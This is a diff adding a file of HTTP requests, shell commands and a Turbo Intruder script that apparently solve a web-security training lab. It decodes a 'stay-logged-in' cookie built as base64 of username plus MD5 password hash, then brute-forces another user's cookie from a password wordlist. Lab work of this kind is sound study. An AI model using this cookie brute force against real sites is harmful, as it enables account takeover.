@@ -1,0 +1,41 @@
+POST /login HTTP/1.1
+
+username=wiener&password=peter&stay-logged-in=on
+
+GET /my-account HTTP/1.1
+Cookie: session=szSfJBl4z1HE7V0eb9zgyGMMn5WAXjm5; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+$ echo -n 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' | base64 -d
+
+$ echo -n 'peter' | md5sum
+
+GET /logout HTTP/1.1
+Cookie: session=szSfJBl4z1HE7V0eb9zgyGMMn5WAXjm5; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+GET /my-account HTTP/1.1
+Cookie: session=szSfJBl4z1HE7V0eb9zgyGMMn5WAXjm5; stay-logged-in=%s
+
+
+import base64
+import hashlib
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for word in open('/tmp/auth-lab-passwords'):
+        engine.queue(target.req, base64.b64encode("carlos:" + hashlib.md5(word.rstrip().encode('utf-8')).hexdigest()))
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 302:
+      table.add(req)
+
+
+GET /my-account HTTP/1.1
+Cookie: session=szSfJBl4z1HE7V0eb9zgyGMMn5WAXjm5; stay-logged-in=Y2FybG9zOmIzZjk1MmQ1ZDlhZGVhNmY2M2JlZTlkNGM2ZmNlZWFh
